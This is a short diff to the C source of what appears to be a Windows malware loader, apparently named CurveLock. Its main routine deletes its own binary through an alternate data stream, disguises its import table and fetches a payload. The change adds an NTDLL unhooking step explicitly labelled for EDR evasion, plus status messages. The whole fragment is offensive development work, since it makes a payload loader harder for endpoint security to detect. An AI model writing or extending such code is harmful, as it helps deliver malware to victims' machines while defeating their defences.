@@ -1,6 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "common.h"
+
+// Definitions
 #define NEW_STREAM L":CurveLockRandomStream"
 
 // Generate a random seed at compile time
@@ -152,11 +154,19 @@ BOOL DeleteSelf() {
 int main() {
 
 	//Delete the binary
-	DeleteSelf();
+	if (!DeleteSelf()) {
+		printf("[!] Failed To Delete Self Binary \n");
+	}
 	
 	//Initiate IAT camouflage
 	IatCamouflage();
+	printf("[+] IAT Camouflage Done \n");
     
+	// Unhook NTDLL for EDR Evasion
+	if (!UnhookNtDLL()) {
+		printf("[!] Failed To Unhook NTDLL \n");
+	}
+
 	//Fetching payload
 	if (!fetchPayload()) {
 		printf("[!] Failed To Fetch Payload \n");
